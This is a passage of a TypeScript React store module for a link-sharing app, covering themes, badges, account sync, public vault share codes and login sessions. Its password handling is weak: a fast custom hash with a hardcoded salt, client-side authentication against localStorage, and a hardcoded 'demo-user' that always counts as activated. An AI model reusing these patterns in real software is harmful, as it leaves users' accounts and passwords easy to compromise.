/**
 * @license
 * Proprietary Software Matrix v1.0.0
 * Copyright (c) 2026 𝕄𝕣𝕎𝕙𝕠?.𝔸𝕀. All rights reserved.
 * Unauthorized copying, modification, or distribution is strictly prohibited.
 */
import { useState, useCallback, useEffect } from 'react';
import type { LinkItem, UserProfile, InboxMessage, AppSettings, UserAccount, ThemeDef, Analytics, Artwork, ChatMessage, BadgeType, UserBadge, PublicVaultSnapshot } from './types';
import {
  checkIdentityAvailability,
  serverCreateUser,
  serverLoadUser,
  serverAuthenticate,
  serverRecordLogin,
  serverRecordLogout,
  serverUpdatePassword,
  serverUpdateSettings,
  serverUpdateProfile,
  serverUpdateLinks,
  serverUpdateInbox,
  serverUpdateAnalytics,
  serverUpdateAccount,
  serverDeleteUser,
  serverPurgeByLogin,
  serverSavePublicVault,
  serverLoadPublicVault,
  ACCOUNT_NOT_FOUND,
  serverDeletePublicVault,
  serverFindByRecovery,
  serverListAccounts,
  recordToAccount,
  migrateLegacyAccountsToServer,
  serverImportUser,
  serverWipeAll,
  type ServerUserRecord,
} from './serverDb';
import {
  apiSignup,
  apiUpsertAccount,
  apiLogin,
  apiActivate,
  apiResetPassword,
  apiGetVault,
  apiSaveVault,
  apiDeleteVault,
  apiPatchUser,
  apiDeleteUser,
  apiDeleteUserByLogin,
  apiDeleteRemoteAccount,
  apiResetRemoteDatabase,
  type RemoteUserRecord,
} from './apiClient';
import {
  resolveMediaFromStores,
  persistMusic,
  persistArtwork,
  clearLocalMedia,
} from './mediaStorage';
import {
  loadDevicePrefs,
  saveDevicePrefs,
  clearDevicePrefs,
  mergeWithDevicePrefs,
  splitSettingsPatch,
  toServerSettings,
} from './devicePrefs';

export function hasBadge(profile: UserProfile, badge: BadgeType): boolean {
  return profile.badges.includes(badge);
}

export function hasVipAccess(profile: UserProfile): boolean {
  return profile.isAdmin || profile.badges.some(b => ['vip', 'owner', 'staff', 'dev'].includes(b));
}

function ensureSettings(s: Partial<AppSettings> & AppSettings): AppSettings {
  return {
    enableInbox: s.enableInbox ?? true,
    enableZBD: s.enableZBD ?? true,
    enableAlby: s.enableAlby ?? true,
    animationsEnabled: s.animationsEnabled ?? true,
    compactMode: s.compactMode ?? false,
    particleEffects: s.particleEffects ?? true,
    glowEffects: s.glowEffects ?? true,
    stealthMode: s.stealthMode ?? true,
    musicStorage: s.musicStorage ?? 'local',
    artworkStorage: s.artworkStorage ?? 'local',
  };
}

// ─── Theme Definitions ────────────────────────────────────────
const BASE_THEMES: ThemeDef[] = [
  { id:'bitcoin',name:'Bitcoin Gold',emoji:'₿',bg:'from-[#1e1402] via-[#2a1b04] to-[#120a01]',cardBg:'bg-orange-500/[0.1]',cardBorder:'border-orange-500/30',cardHover:'hover:border-orange-400/60 hover:bg-orange-500/[0.2]',accent:'text-orange-400',accentRgb:'249,115,22',textPrimary:'text-white',textSecondary:'text-orange-100/60',textMuted:'text-orange-200/30',btnGradient:'from-orange-500 to-amber-600',particleColor:'#f7931a',liveEffect:'coins' },
  { id:'lightning',name:'Zap Lightning',emoji:'⚡',bg:'from-[#1a1300] via-[#261d00] to-[#0d0a00]',cardBg:'bg-yellow-500/[0.1]',cardBorder:'border-yellow-500/30',cardHover:'hover:border-yellow-400/60 hover:bg-yellow-500/[0.2]',accent:'text-yellow-400',accentRgb:'234,179,8',textPrimary:'text-white',textSecondary:'text-yellow-100/60',textMuted:'text-yellow-200/30',btnGradient:'from-yellow-500 to-orange-500',particleColor:'#fbbf24',liveEffect:'bolts' },
  { id:'cyberpunk',name:'Night City',emoji:'🌃',bg:'from-[#0f001a] via-[#1a0033] to-[#050010]',cardBg:'bg-purple-500/[0.1]',cardBorder:'border-purple-500/30',cardHover:'hover:border-purple-400/60 hover:bg-purple-500/[0.2]',accent:'text-purple-400',accentRgb:'147,51,234',textPrimary:'text-white',textSecondary:'text-purple-100/60',textMuted:'text-purple-200/30',btnGradient:'from-purple-600 to-fuchsia-600',particleColor:'#a855f7',liveEffect:'stars' },
  { id:'matrix',name:'Matrix Grid',emoji:'🟢',bg:'from-[#000a00] via-[#001a00] to-[#000d00]',cardBg:'bg-green-500/[0.1]',cardBorder:'border-green-500/30',cardHover:'hover:border-green-400/60 hover:bg-green-500/[0.2]',accent:'text-green-400',accentRgb:'74,222,128',textPrimary:'text-green-100',textSecondary:'text-green-300/70',textMuted:'text-green-400/40',btnGradient:'from-green-600 to-emerald-600',particleColor:'#4ade80',liveEffect:'rain' },
];

const COLOR_VARIATIONS = [
  { n: 'Red', h: 0, r: '239,68,68' }, { n: 'Blue', h: 220, r: '59,130,246' }, 
  { n: 'Emerald', h: 150, r: '16,185,129' }, { n: 'Pink', h: 320, r: '236,72,153' },
  { n: 'Violet', h: 260, r: '139,92,246' }, { n: 'Cyan', h: 190, r: '6,182,212' },
  { n: 'Rose', h: 340, r: '244,63,94' }, { n: 'Amber', h: 45, r: '245,158,11' }
];
const EFFECTS: ThemeDef['liveEffect'][] = ['stars', 'rain', 'bolts', 'coins', 'fire', 'snow', 'bubbles', 'petals'];

export const THEMES: ThemeDef[] = [...BASE_THEMES];
COLOR_VARIATIONS.forEach(c => {
  EFFECTS.forEach(e => {
    THEMES.push({
      id: `${c.n.toLowerCase()}-${e}` as any,
      name: `${c.n} ${e.charAt(0).toUpperCase() + e.slice(1)}`,
      emoji: '✨',
      bg: `from-[hsl(${c.h},50%,15%)] via-[hsl(${c.h},40%,8%)] to-[#05050a]`,
      cardBg: `bg-[rgba(${c.r},0.15)]`,
      cardBorder: `border-[rgba(${c.r},0.4)]`,
      cardHover: `hover:border-[rgba(${c.r},0.8)] hover:bg-[rgba(${c.r},0.25)] hover:shadow-[0_0_30px_rgba(${c.r},0.2)]`,
      accent: `text-[rgba(${c.r},1)]`,
      accentRgb: c.r,
      textPrimary: 'text-white',
      textSecondary: `text-[rgba(${c.r},0.8)]`,
      textMuted: `text-[rgba(${c.r},0.4)]`,
      btnGradient: `from-[rgba(${c.r},1)] via-[rgba(${c.r},0.8)] to-[#0a0a0a]`,
      particleColor: `rgba(${c.r},1)`,
      liveEffect: e
    });
  });
});

export function getTheme(id: string): ThemeDef { return THEMES.find(t => t.id === id) || THEMES[2]; }

export const BADGE_METADATA: Record<BadgeType, UserBadge> = {
  owner: { type: 'owner', label: 'Owner', color: 'bg-red-500/10 text-red-400 border-red-500/20', icon: '👑' },
  staff: { type: 'staff', label: 'Staff', color: 'bg-orange-500/10 text-orange-400 border-orange-500/20', icon: '🛡️' },
  dev: { type: 'dev', label: 'Developer', color: 'bg-blue-500/10 text-blue-400 border-blue-500/20', icon: '💻' },
  verified: { type: 'verified', label: 'Verified', color: 'bg-cyan-500/10 text-cyan-400 border-cyan-500/20', icon: '✅' },
  vip: { type: 'vip', label: 'VIP', color: 'bg-purple-500/10 text-purple-400 border-purple-500/20', icon: '💎' },
  supporter: { type: 'supporter', label: 'Supporter', color: 'bg-pink-500/10 text-pink-400 border-pink-500/20', icon: '💖' },
  discord: { type: 'discord', label: 'Discord', color: 'bg-indigo-500/10 text-indigo-400 border-indigo-500/20', icon: '🎮' },
  beta: { type: 'beta', label: 'Beta Stage', color: 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20', icon: '🚀' },
  tester: { type: 'tester', label: 'Tester', color: 'bg-green-500/10 text-green-400 border-green-500/20', icon: '🧪' },
};

const K = { accounts:'lv_accounts',user:'lv_current_user',links:'lv_links',profile:'lv_profile',inbox:'lv_inbox',settings:'lv_settings',analytics:'lv_analytics', version: 'lv_version', license: 'lv_license_key', publicVaults: 'lv_public_vaults' };
const APP_VERSION = '1.0.0';
const CHANGELOG = [
  "Real API server: accounts and profiles sync across all devices",
  "Profile share QR: tap icon under avatar to open full link popup",
  "Public vault URLs load from server — scan QR on any phone",
  "Cross-device sign-in: log in on phone with same username + password",
];

function ld<T>(k:string,f:T):T{ try{const s=localStorage.getItem(k);return s?JSON.parse(s):f;}catch{return f;} }
function sv<T>(k:string,d:T){ try{localStorage.setItem(k,JSON.stringify(d));}catch{} }

function normalizeLoginId(s: string): string {
  let v = String(s).normalize('NFC').trim().toLowerCase();
  if (v.startsWith('@')) v = v.slice(1);
  return v;
}

function hash(s:string):string{
  const salt = "LV_2026_MATRIX_";
  let h1 = 0xdeadbeef, h2 = 0x41c6ce57;
  const combined = salt + s;
  for (let i = 0; i < combined.length; i++) {
    const char = combined.charCodeAt(i);
    h1 = Math.imul(h1 ^ char, 2654435761);
    h2 = Math.imul(h2 ^ char, 1597334677);
  }
  h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
  h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
  return (h1 >>> 0).toString(16).padStart(8, '0') + (h2 >>> 0).toString(16).padStart(8, '0');
}

function generateShareCode(username: string): string {
  const slug = username.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 8) || 'VAULT';
  const suffix = Math.random().toString(36).substring(2, 6).toUpperCase();
  return `LV-${slug}-${suffix}`;
}

function ensureAccountFields(acc: UserAccount): UserAccount {
  return {
    ...acc,
    shareCode: acc.shareCode || generateShareCode(acc.username),
    isActivated: !!acc.isActivated,
  };
}

function migrateAccounts(db: UserAccount[]): UserAccount[] {
  const migrated = db.map(ensureAccountFields);
  if (JSON.stringify(migrated) !== JSON.stringify(db)) sv(K.accounts, migrated);
  return migrated;
}

function buildPublicSnapshot(shareCode: string, profile: UserProfile, links: LinkItem[], settings: AppSettings): PublicVaultSnapshot {
  return {
    shareCode,
    username: profile.username,
    profile: { ...profile, chatMessages: [], isAdmin: false },
    links: links.filter(l => l.enabled),
    settings: {
      enableZBD: settings.enableZBD,
      enableAlby: settings.enableAlby,
      particleEffects: settings.particleEffects,
      glowEffects: settings.glowEffects,
    },
    updatedAt: Date.now(),
  };
}

function savePublicVault(snapshot: PublicVaultSnapshot) {
  serverSavePublicVault(snapshot);
  const registry = ld<Record<string, PublicVaultSnapshot>>(K.publicVaults, {});
  registry[snapshot.shareCode.toUpperCase()] = snapshot;
  sv(K.publicVaults, registry);
  apiSaveVault(snapshot).catch(() => {});
}

function remoteToServerRecord(user: RemoteUserRecord): ServerUserRecord {
  return {
    userId: user.userId,
    username: user.username,
    displayName: user.displayName,
    email: user.email,
    discord: user.discord,
    passwordHash: user.passwordHash,
    activationCode: user.activationCode,
    recoveryKey: user.recoveryKey,
    shareCode: user.shareCode,
    isActivated: user.isActivated,
    isBanned: user.isBanned,
    isFrozen: user.isFrozen,
    createdAt: user.createdAt ?? Date.now(),
    profile: { ...user.profile, music: [], artworks: [] },
    settings: user.settings,
    links: user.links,
    inbox: user.inbox,
    analytics: user.analytics,
    serverMusic: [],
    serverArtwork: [],
  };
}

function applyRemoteUser(acc: UserAccount, user: RemoteUserRecord) {
  const ex = migrateAccounts(ld<UserAccount[]>(K.accounts, []));
  const localAcc = ex.find(a => a.id === acc.id);
  const isActivated = !!(acc.isActivated || user.isActivated || localAcc?.isActivated);
  const mergedAcc = { ...acc, isActivated };
  const mergedUser = { ...user, isActivated };
  serverImportUser(remoteToServerRecord(mergedUser));
  return cacheAccountLocally(mergedAcc, ex);
}

function mergeLoginActivation(account: UserAccount, user: RemoteUserRecord, loginId: string) {
  const localAcc = findAccountByLogin(loginId);
  const isActivated = !!(account.isActivated || user.isActivated || localAcc?.isActivated);
  return {
    mergedAccount: { ...account, isActivated },
    mergedUser: { ...user, isActivated },
    isActivated,
  };
}

function completeRemoteLogin(
  loginId: string,
  account: UserAccount,
  user: RemoteUserRecord,
  session: UserSessionData,
) {
  const { mergedAccount, mergedUser, isActivated } = mergeLoginActivation(account, user, loginId);
  if (!account.isActivated && isActivated) {
    syncActivationToRemote(account.id).catch(() => {});
  }
  const updated = applyRemoteUser(mergedAccount, mergedUser);
  return { mergedAccount, updated, isActivated, session };
}

/** Push activation flag to remote when local/browser already unlocked the account. */
async function syncActivationToRemote(userId: string) {
  try {
    await apiPatchUser(userId, { isActivated: true });
  } catch {
    const acc = resolveAccount(userId);
    if (!acc) return;
    const session = loadUserData(userId, acc);
    await upsertRemoteAccount({ ...acc, isActivated: true }, session);
  }
}

function syncLocalAccountToRemote(acc: UserAccount, session: UserSessionData) {
  const publicSnap = acc.shareCode
    ? buildPublicSnapshot(acc.shareCode, session.profile, session.links, session.settings)
    : undefined;
  apiUpsertAccount({
    account: acc,
    profile: { ...session.profile, music: [], artworks: [] },
    settings: toServerSettings(session.settings),
    links: session.links,
    inbox: session.inbox,
    analytics: session.analytics,
    publicVault: publicSnap,
  }).catch(() => {});
}

async function upsertRemoteAccount(acc: UserAccount, session: UserSessionData) {
  const publicSnap = acc.shareCode
    ? buildPublicSnapshot(acc.shareCode, session.profile, session.links, session.settings)
    : undefined;
  await apiUpsertAccount({
    account: acc,
    profile: { ...session.profile, music: [], artworks: [] },
    settings: toServerSettings(session.settings),
    links: session.links,
    inbox: session.inbox,
    analytics: session.analytics,
    publicVault: publicSnap,
  });
}

export function isVaultShareCode(segment: string): boolean {
  const code = decodeURIComponent(segment).trim();
  return /^LV-[A-Z0-9]+-[A-Z0-9]+$/i.test(code);
}

export function parseShareCodeFromPath(pathname?: string): string | null {
  const path = pathname ?? (typeof window !== 'undefined' ? window.location.pathname : '');
  const segments = path.replace(/\/+$/, '').split('/').filter(Boolean);
  if (segments.length === 0) return null;
  const last = segments[segments.length - 1];
  const code = decodeURIComponent(last).trim();
  return isVaultShareCode(code) ? code.toUpperCase() : null;
}

export function buildVaultShareUrl(shareCode: string): string {
  const encoded = encodeURIComponent(shareCode);
  const base = (import.meta.env.BASE_URL || '/').replace(/\/?$/, '/');
  if (typeof window === 'undefined') {
    return base === '/' ? `/${encoded}` : `${base}?vault=${encoded}`;
  }
  const origin = window.location.origin;
  if (base !== '/') {
    return `${origin}${base}?vault=${encoded}`;
  }
  return `${origin}/${encoded}`;
}

export function resolveVaultFromUrl(): PublicVaultSnapshot | null {
  if (typeof window === 'undefined') return null;

  const fromPath = parseShareCodeFromPath();
  if (fromPath) {
    const snap = loadVaultByShareCode(fromPath);
    if (snap) return snap;
  }

  const params = new URLSearchParams(window.location.search);
  const vaultCode = params.get('vault');
  if (vaultCode) {
    let snapshot = loadVaultByShareCode(vaultCode);
    if (!snapshot && window.location.hash) {
      snapshot = decodeVaultFromHash(window.location.hash);
    }
    return snapshot;
  }

  return null;
}

export function loadVaultByShareCode(code: string): PublicVaultSnapshot | null {
  const normalized = code.trim().toUpperCase();
  const fromServer = serverLoadPublicVault(normalized);
  if (fromServer) return fromServer;

  const registry = ld<Record<string, PublicVaultSnapshot>>(K.publicVaults, {});
  if (registry[normalized]) return registry[normalized];

  const acc = ld<UserAccount[]>(K.accounts, []).find(a => a.shareCode?.toUpperCase() === normalized);
  if (!acc) return null;
  const session = loadUserData(acc.id, acc);
  return buildPublicSnapshot(acc.shareCode, session.profile, session.links, session.settings);
}

export async function loadVaultByShareCodeAsync(code: string): Promise<PublicVaultSnapshot | null> {
  const normalized = code.trim().toUpperCase();
  const remote = await apiGetVault(normalized);
  if (remote) {
    savePublicVault(remote);
    return remote;
  }
  return loadVaultByShareCode(normalized);
}

export async function resolveVaultFromUrlAsync(): Promise<PublicVaultSnapshot | null> {
  if (typeof window === 'undefined') return null;

  const fromPath = parseShareCodeFromPath();
  if (fromPath) {
    return loadVaultByShareCodeAsync(fromPath);
  }

  const params = new URLSearchParams(window.location.search);
  const vaultCode = params.get('vault');
  if (vaultCode) {
    let snapshot = await loadVaultByShareCodeAsync(vaultCode);
    if (!snapshot && window.location.hash) {
      snapshot = decodeVaultFromHash(window.location.hash);
    }
    return snapshot;
  }

  return null;
}

export function decodeVaultFromHash(hash: string): PublicVaultSnapshot | null {
  try {
    const raw = hash.startsWith('#') ? hash.slice(1) : hash;
    if (!raw) return null;
    const b64 = raw.replace(/-/g, '+').replace(/_/g, '/');
    return JSON.parse(decodeURIComponent(escape(atob(b64)))) as PublicVaultSnapshot;
  } catch {
    return null;
  }
}

export function encodeVaultToHash(snapshot: PublicVaultSnapshot): string {
  const b64 = btoa(unescape(encodeURIComponent(JSON.stringify(snapshot))))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  return `#${b64}`;
}

const DEF_LINKS: LinkItem[] = [];
const DEF_PROFILE: UserProfile = {
  username: '',
  displayName: '',
  bio: '',
  avatarType: 'emoji',
  avatarEmoji: '👤',
  avatarUrl: '',
  zbdGamerTag: '',
  albyAddress: '',
  theme: 'cyberpunk',
  showQR: true,
  badges: [],
  music: [],
  artworks: [],
  chatMessages: [],
  onboarded: false,
  isVerified: false,
  isAdmin: false,
};
const DEF_SETTINGS: AppSettings = { enableInbox:true, enableZBD:true, enableAlby:true, animationsEnabled:true, compactMode:false, particleEffects:true, glowEffects:true, stealthMode: true, musicStorage: 'local', artworkStorage: 'local' };
const DEF_INBOX: InboxMessage[] = [];
const DEF_ANALYTICS: Analytics = { totalClicks:0, totalViews:0, clicksByDay:{}, lastUpdated:Date.now() };

const USER_DATA_KEYS = [K.links, K.profile, K.inbox, K.settings, K.analytics] as const;

function uk(base: string, uid: string) { return `${base}:${uid}`; }

interface UserSessionData {
  links: LinkItem[];
  profile: UserProfile;
  inbox: InboxMessage[];
  settings: AppSettings;
  analytics: Analytics;
}

function loadUserData(uid: string, account?: UserAccount | null): UserSessionData {
  const serverRec = serverLoadUser(uid);
  const device = loadDevicePrefs(uid);

  const profileFallback: UserProfile = account
    ? { ...DEF_PROFILE, username: account.username, displayName: account.displayName || account.username }
    : DEF_PROFILE;

  const serverProfile = serverRec?.profile ?? profileFallback;
  const settings = ensureSettings(
    mergeWithDevicePrefs(serverRec?.settings ?? toServerSettings(DEF_SETTINGS), device),
  );
  const links = serverRec?.links ?? DEF_LINKS;
  const inbox = serverRec?.inbox ?? DEF_INBOX;
  const analytics = serverRec?.analytics ?? DEF_ANALYTICS;
  const { music, artworks } = resolveMediaFromStores(uid, settings, serverProfile.music, serverProfile.artworks);

  let profile = { ...serverProfile, music, artworks };
  if (profile.avatarType === 'image' && device.localAvatarUrl) {
    profile = { ...profile, avatarUrl: device.localAvatarUrl };
  }

  return {
    links,
    profile,
    inbox,
    settings,
    analytics,
  };
}

/** Resolve account from local list or server DB (cross-device sync). */
export function resolveAccount(userId: string | null | undefined, accountList?: UserAccount[]): UserAccount | undefined {
  if (!userId) return undefined;
  const list = accountList ?? ld<UserAccount[]>(K.accounts, []);
  const fromList = list.find(a => a.id === userId);
  if (fromList) return fromList;
  const serverRec = serverLoadUser(userId);
  return serverRec ? recordToAccount(serverRec) : undefined;
}

export function isAccountActivated(userId: string | null | undefined, account?: UserAccount): boolean {
  if (!userId) return false;
  if (userId === 'demo-user') return true;
  const acc = account ?? resolveAccount(userId);
  const serverRec = serverLoadUser(userId);
  return !!(acc?.isActivated || serverRec?.isActivated);
}

/** Remove one account from local server DB, lv_accounts, vault registry, and session data. */
function purgeAccountById(userId: string, shareCode?: string) {
  if (userId === 'demo-user') return ld<UserAccount[]>(K.accounts, []);
  serverDeleteUser(userId);
  clearUserData(userId);
  clearLocalMedia(userId);
  if (shareCode) {
    serverDeletePublicVault(shareCode);
    const registry = ld<Record<string, PublicVaultSnapshot>>(K.publicVaults, {});
    delete registry[shareCode.toUpperCase()];
    sv(K.publicVaults, registry);
  }
  const rem = ld<UserAccount[]>(K.accounts, []).filter(a => a.id !== userId);
  sv(K.accounts, rem);
  return rem;
}

/** Synchronous session read for page-load routing (refresh restore). */
export function getBootSession(): {
  userId: string | null;
  isActivated: boolean;
  onboarded: boolean;
  shareCode?: string;
} {
  const uid = ld<string | null>(K.user, null);
  if (!uid) return { userId: null, isActivated: false, onboarded: false };
  if (uid === 'demo-user') {
    return { userId: uid, isActivated: true, onboarded: true };
  }

  const acc = resolveAccount(uid);
  const serverRec = serverLoadUser(uid);
  if (!acc && !serverRec) {
    clearStaleSession(uid);
    return { userId: null, isActivated: false, onboarded: false };
  }

  const account = acc ?? (serverRec ? recordToAccount(serverRec) : undefined);
  const activated = !!(account?.isActivated || serverRec?.isActivated);

  // Unactivated sessions are only valid during an active login — never on refresh
  if (!activated) {
    clearStaleSession(uid);
    return { userId: null, isActivated: false, onboarded: false };
  }

  const session = loadUserData(uid, account);
  return {
    userId: uid,
    isActivated: true,
    onboarded: !!session.profile.onboarded,
    shareCode: account?.shareCode,
  };
}

function saveUserData(uid: string, data: UserSessionData) {
  serverUpdateProfile(uid, data.profile);
  serverUpdateSettings(uid, toServerSettings(data.settings));
  saveDevicePrefs(uid, {
    animationsEnabled: data.settings.animationsEnabled,
    compactMode: data.settings.compactMode,
    stealthMode: data.settings.stealthMode,
    particleEffects: data.settings.particleEffects,
    glowEffects: data.settings.glowEffects,
    musicStorage: data.settings.musicStorage,
    artworkStorage: data.settings.artworkStorage,
  });
  serverUpdateLinks(uid, data.links);
  serverUpdateInbox(uid, data.inbox);
  serverUpdateAnalytics(uid, data.analytics);
  persistMusic(uid, data.settings, data.profile.music);
  persistArtwork(uid, data.settings, data.profile.artworks);
  apiPatchUser(uid, {
    profile: { ...data.profile, music: [], artworks: [] },
    settings: toServerSettings(data.settings),
    links: data.links,
    inbox: data.inbox,
    analytics: data.analytics,
  }).catch(async () => {
    const acc = resolveAccount(uid);
    if (acc) await upsertRemoteAccount(acc, data).catch(() => {});
  });
}

function clearUserData(uid: string) {
  USER_DATA_KEYS.forEach(key => localStorage.removeItem(uk(key, uid)));
  clearDevicePrefs(uid);
}

function accountMatchesLogin(acc: UserAccount, loginId: string): boolean {
  const key = normalizeLoginId(loginId);
  if (normalizeLoginId(acc.username) === key) return true;
  if (acc.email && normalizeLoginId(acc.email) === key) return true;
  if (acc.discord && normalizeLoginId(acc.discord) === key) return true;
  return false;
}

/** Merge lv_accounts + server DB and migrate legacy rows before auth lookups. */
export function ensureAccountStoreReady(): UserAccount[] {
  const local = migrateAccounts(ld<UserAccount[]>(K.accounts, []));
  migrateLegacyAccountsToServer(local);
  const server = serverListAccounts();
  const byId = new Map<string, UserAccount>();
  server.forEach(a => byId.set(a.id, a));
  local.forEach(a => { if (!byId.has(a.id)) byId.set(a.id, a); });
  const merged = Array.from(byId.values());
  if (merged.length) sv(K.accounts, merged);
  return merged;
}

export function findAccountByLogin(loginId: string, accountList?: UserAccount[]): UserAccount | undefined {
  const key = normalizeLoginId(loginId);
  if (!key) return undefined;
  const list = accountList ?? ensureAccountStoreReady();
  return list.find(a => accountMatchesLogin(a, key));
}

type LocalAuthResult =
  | { ok: true; account: UserAccount; source: 'server' | 'accounts' }
  | { ok: false; error: 'not_found' | 'invalid_credentials' };

/** Authenticate against server DB and lv_accounts (whichever has the user first). */
function authenticateLocally(loginId: string, passHash: string): LocalAuthResult {
  ensureAccountStoreReady();
  const serverAuth = serverAuthenticate(loginId, passHash);
  if (serverAuth.ok) {
    return { ok: true, account: recordToAccount(serverAuth.user), source: 'server' };
  }
  if (serverAuth.error === 'invalid_credentials') {
    return { ok: false, error: 'invalid_credentials' };
  }
  const fromList = findAccountByLogin(loginId);
  if (!fromList) return { ok: false, error: 'not_found' };
  if (fromList.passwordHash !== passHash) return { ok: false, error: 'invalid_credentials' };
  if (fromList.isBanned) return { ok: false, error: 'invalid_credentials' };
  return { ok: true, account: fromList, source: 'accounts' };
}

function finishLoginSession(
  acc: UserAccount,
  source: 'server' | 'accounts' = 'server',
): { acc: UserAccount; session: UserSessionData; updated: UserAccount[] } {
  ensureAccountStoreReady();
  if (source === 'accounts') {
    const serverRec = serverLoadUser(acc.id);
    if (!serverRec) {
      const session = loadUserData(acc.id, acc);
      serverCreateUser(acc, session.profile, session.settings, session.links, session.inbox, session.analytics);
    }
  }
  const ex = ensureAccountStoreReady();
  const updated = cacheAccountLocally(acc, ex);
  serverRecordLogin(acc.id);
  const session = loadUserData(acc.id, acc);
  saveUserData(acc.id, session);
  syncLocalAccountToRemote(acc, session);
  return { acc, session, updated };
}

/** Drop lv_accounts rows (and per-user data) matching a login identity. */
function purgeLocalAccountByLogin(loginId: string): UserAccount[] {
  const accounts = ld<UserAccount[]>(K.accounts, []);
  const victims = accounts.filter(a => accountMatchesLogin(a, loginId));
  if (!victims.length) return accounts;
  const victimIds = new Set(victims.map(a => a.id));
  for (const acc of victims) {
    serverDeleteUser(acc.id);
    clearUserData(acc.id);
    clearLocalMedia(acc.id);
    if (acc.shareCode) {
      serverDeletePublicVault(acc.shareCode);
      const registry = ld<Record<string, PublicVaultSnapshot>>(K.publicVaults, {});
      delete registry[acc.shareCode.toUpperCase()];
      sv(K.publicVaults, registry);
    }
  }
  const rem = accounts.filter(a => !victimIds.has(a.id));
  sv(K.accounts, rem);
  const current = ld<string | null>(K.user, null);
  if (current && victimIds.has(current)) clearStaleSession(current);
  return rem;
}

/** Wipe every LinkVault key from browser storage (lv_accounts, lv_server_db, sessions, etc.). */
export function wipeAllLocalAppData() {
  try {
    const keys = Object.keys(localStorage).filter(
      k => k.startsWith('lv_') || k.startsWith('linkvault_'),
    );
    keys.forEach(k => localStorage.removeItem(k));
  } catch {}
  serverWipeAll();
  sv(K.accounts, []);
  sv(K.publicVaults, {});
}

/** Purge ghost local/server identity rows before signup or after remote delete. */
function purgeIdentityGhosts(...identities: (string | undefined)[]) {
  const seen = new Set<string>();
  for (const raw of identities) {
    if (!raw?.trim()) continue;
    const key = normalizeLoginId(raw);
    if (!key || seen.has(key)) continue;
    seen.add(key);
    purgeLocalAccountByLogin(key);
    serverPurgeByLogin(key);
  }
}

/** Clear session keys so refresh never restores auth/activate for a deleted or stale user. */
export function clearStaleSession(userId?: string) {
  const uid = userId ?? ld<string | null>(K.user, null);
  if (uid && uid !== 'demo-user') {
    clearUserData(uid);
    clearLocalMedia(uid);
  }
  sv(K.user, null);
  USER_DATA_KEYS.forEach(k => localStorage.removeItem(k));
  try { localStorage.removeItem(K.license); } catch {}
}

/** Clear active session pointer only — keeps account row so user can log in again (e.g. left activate screen). */
export function abandonUnactivatedSession() {
  const uid = ld<string | null>(K.user, null);
  if (!uid || uid === 'demo-user') return;
  const acc = resolveAccount(uid);
  if (acc && !acc.isActivated) clearStaleSession(uid);
}

function isApiAuthFailure(msg: string): boolean {
  const m = msg.toLowerCase();
  return m.includes('account not found') || m.includes('invalid credentials');
}

function isApiReachableFailure(msg: string): boolean {
  if (!msg) return true;
  const m = msg.toLowerCase();
  if (isApiAuthFailure(msg)) return false;
  if (m.includes('banned') || m.includes('frozen')) return false;
  return true;
}

function cacheAccountLocally(acc: UserAccount, all: UserAccount[]): UserAccount[] {
  const idx = all.findIndex(a => a.id === acc.id);
  const next = idx >= 0 ? all.map((a, i) => (i === idx ? acc : a)) : [...all, acc];
  sv(K.accounts, next);
  return next;
}

export function useAppStore() {
  const [accounts, setAcc] = useState<UserAccount[]>(() => ensureAccountStoreReady());
  const [accountsReady, setAccountsReady] = useState(false);
  const [currentUser, setCU] = useState<string | null>(() => ld(K.user, null));

  const bootUser = ld<string | null>(K.user, null);
  const bootAccount = bootUser ? resolveAccount(bootUser) : undefined;
  const bootData = bootUser ? loadUserData(bootUser, bootAccount) : {
    links: DEF_LINKS,
    profile: DEF_PROFILE,
    inbox: DEF_INBOX,
    settings: DEF_SETTINGS,
    analytics: DEF_ANALYTICS,
  };

  const [links, setLinksS] = useState<LinkItem[]>(bootData.links);
  const [profile, setProfileS] = useState<UserProfile>(bootData.profile);
  const [inbox, setInboxS] = useState<InboxMessage[]>(bootData.inbox);
  const [settings, setSettingsS] = useState<AppSettings>(bootData.settings);
  const [analytics, setAnalyticsS] = useState<Analytics>(bootData.analytics);

  useEffect(() => {
    const merged = ensureAccountStoreReady();
    setAcc(merged);
    setAccountsReady(true);

    const uid = ld<string | null>(K.user, null);
    if (!uid || uid === 'demo-user') return;

    const localAcc = ld<UserAccount[]>(K.accounts, []).find(a => a.id === uid);
    const serverRec = serverLoadUser(uid);

    if (!serverRec && !localAcc) {
      setCU(null);
      clearStaleSession(uid);
      setAcc(ld<UserAccount[]>(K.accounts, []));
      return;
    }

    const acc = serverRec ? recordToAccount(serverRec) : localAcc!;
    if (!acc.isActivated && !serverRec?.isActivated) {
      setCU(null);
      clearStaleSession(uid);
      return;
    }

    setAcc(prev => cacheAccountLocally(acc, prev));
    const session = loadUserData(uid, acc);
    setLinksS(session.links);
    setProfileS(session.profile);
    setInboxS(session.inbox);
    setSettingsS(session.settings);
    setAnalyticsS(session.analytics);
  }, []);

  const syncPublicVault = useCallback((session: { profile?: UserProfile; links?: LinkItem[]; settings?: AppSettings }) => {
    if (!currentUser || currentUser === 'demo-user') return;
    const acc = resolveAccount(currentUser, accounts);
    if (!acc?.shareCode || !isAccountActivated(currentUser, acc)) return;
    const snapshot = buildPublicSnapshot(
      acc.shareCode,
      session.profile ?? profile,
      session.links ?? links,
      session.settings ?? settings,
    );
    savePublicVault(snapshot);
  }, [currentUser, accounts, profile, links, settings]);

  const setProfile=useCallback((u:Partial<UserProfile>)=>{setProfileS(p=>{const n={...p,...u};if(currentUser){const forServer={...n,music:[],artworks:[]};if(!hasVipAccess(n)&&forServer.avatarUrl?.startsWith('data:')){forServer.avatarUrl='';}serverUpdateProfile(currentUser,forServer);}syncPublicVault({ profile: n });return n;});},[currentUser, syncPublicVault]);
  const setSettings=useCallback((u:Partial<AppSettings>)=>{
    setSettingsS(p=>{
      const patch = { ...u };
      if (patch.musicStorage === 'server' && !hasVipAccess(profile)) delete patch.musicStorage;
      if (patch.artworkStorage === 'server' && !hasVipAccess(profile)) delete patch.artworkStorage;
      const { server, device } = splitSettingsPatch(patch);
      if (currentUser && Object.keys(device).length) saveDevicePrefs(currentUser, device);
